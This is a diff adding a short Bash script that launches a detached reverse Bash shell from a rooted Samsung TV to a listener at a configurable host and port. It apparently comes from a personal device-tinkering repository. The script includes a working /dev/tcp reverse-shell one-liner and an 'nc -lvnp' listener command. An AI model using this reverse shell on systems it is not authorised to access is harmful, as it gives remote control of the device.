@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+# Launch a detached reverse Bash callback from a rooted Samsung TV.
+# Start the listener first: nc -lvnp 4444
+set -eu
+
+repo=${SAMSUNG_TV_TOOLS_DIR:-/home/cseivert/samsung-tv-tools}
+tv_host=${TV_HOST:-172.16.40.13}
+callback_host=${TV_CALLBACK_HOST:-172.16.10.5}
+callback_port=${TV_SHELL_PORT:-4444}
+
+case "$callback_host" in
+  *[!0-9A-Fa-f:.]*|'')
+    printf 'tv-shell: invalid TV_CALLBACK_HOST: %s\n' "$callback_host" >&2
+    exit 2
+    ;;
+esac
+
+case "$callback_port" in
+  *[!0-9]*|'')
+    printf 'tv-shell: invalid TV_SHELL_PORT: %s\n' "$callback_port" >&2
+    exit 2
+    ;;
+esac
+
+if [ "$callback_port" -lt 1 ] || [ "$callback_port" -gt 65535 ]; then
+  printf 'tv-shell: TV_SHELL_PORT must be between 1 and 65535\n' >&2
+  exit 2
+fi
+
+if [ ! -d "$repo" ]; then
+  printf 'tv-shell: repository not found: %s\n' "$repo" >&2
+  exit 2
+fi
+
+cd "$repo"
+export TV_HOST="$tv_host"
+
+printf 'Requesting TV %s callback to %s:%s\n' \
+  "$TV_HOST" "$callback_host" "$callback_port" >&2
+
+remote_command="/usr/bin/setsid -f /usr/bin/bash -c 'exec 5<>/dev/tcp/$callback_host/$callback_port; exec /usr/bin/bash -i <&5 >&5 2>&5' </dev/null >/dev/null 2>&1"
+
+exec nix --extra-experimental-features 'nix-command flakes' \
+  run .#tv-access -- "$remote_command"
